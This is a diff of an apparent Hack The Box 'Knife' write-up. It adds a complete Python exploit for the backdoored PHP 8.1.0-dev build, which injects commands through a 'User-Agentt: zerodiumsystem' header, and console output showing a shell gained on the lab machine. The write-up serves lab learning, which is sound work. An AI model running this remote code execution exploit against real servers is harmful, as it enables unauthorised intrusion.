@@ -50,10 +50,66 @@ Nmap done: 1 IP address (1 host up) scanned in 9.74 seconds
 
 <h3 data-toc-skip>Alright, let's search for vulnerabilities for these technologies.</h3>
 
+<h3 data-toc-skip>There's a vulnerability for PHP 8.1.0dev.</h3>
 ![knifesearch](https://gpandres.github.io/assets/img/posts/knife/knifesearch.png)
 <https://www.exploit-db.com/exploits/49933>
 
-<h3 data-toc-skip>There's a vulnerability for PHP 8.1.0dev, we can gain access by changing the User-Agent in the browser, burpsuite or use the script</h3>
+<h3 data-toc-skip>I copied the script and executed</h3>
+
+
+```python
+#!/usr/bin/env python3
+import os
+import re
+import requests
+
+host = input("Enter the full host url:\n")
+request = requests.Session()
+response = request.get(host)
+
+if str(response) == '<Response [200]>':
+    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
+    try:
+        while 1:
+            cmd = input("$ ")
+            headers = {
+            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
+            "User-Agentt": "zerodiumsystem('" + cmd + "');"
+            }
+            response = request.get(host, headers = headers, allow_redirects = False)
+            current_page = response.text
+            stdout = current_page.split('<!DOCTYPE html>',1)
+            text = print(stdout[0])
+    except KeyboardInterrupt:
+        print("Exiting...")
+        exit
+
+else:
+    print("\r")
+    print(response)
+    print("Host is not available, aborting...")
+    exit
+
+```
+
+
+```console
+$ python3 exploit.py
+Enter the full host url:
+http://10.10.10.242/
+
+Interactive shell is opened on http://10.10.10.242/
+Can't acess tty; job crontol turned off.
+$ whoami
+james
+```
+<h3 data-toc-skip>We are in!</h3>
+
+
+
+
+
+
 
 
 
